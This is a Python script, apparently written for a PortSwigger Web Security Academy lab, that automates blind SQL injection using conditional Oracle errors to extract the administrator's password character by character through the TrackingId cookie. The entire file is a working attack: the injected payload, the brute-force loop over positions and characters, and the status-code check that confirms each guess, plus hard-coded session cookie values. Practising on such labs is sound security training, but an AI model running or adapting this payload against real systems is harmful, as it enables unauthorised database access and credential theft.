# i wrote a simple script to automate bruteforcing a users passwords from the database on portswiggers lab based on conditional errors for blind sql injection 
# can be resued by anyone and it is open to contributions

import requests
import urllib
pass_index = 1
pass_index_check = ""
payload = "' and (select case when exists(select password from users where username = 'administrator' and substr(password,1,1) = 'a') then 'a' else to_char(1/0) end from dual) = 'a' --"

cookies = {'TrackingId': 'yYlQrFDIvIgH2s7', 'session': 'BmhY0aExSsUvtFNI9TZj3pc2Axaxg842'}

def blind_sqli():
    password = ""
    for i in range(1, 21):
        for j in range(32, 127):
            char = chr(j)
            payload = f"' and (select case when exists(select password from users where username = 'administrator' and substr(password,{i},1) = '{char}') then 'a' else to_char(1/0) end from dual) = 'a' --"
            cookies['TrackingId'] = 'yYlQrFDIvIgH2s7' + urllib.parse.quote(payload)
            req = requests.get('https://0a0e00a703abf8c88063080c004800af.web-security-academy.net/filter?category=Lifestyle', cookies=cookies)

            # check to determine if it is a password character
            if req.status_code == 200:
                password += char
                print(f"Current password: {password}")
                break
        
    print(f"Password found: {password}")

            

blind_sqli()
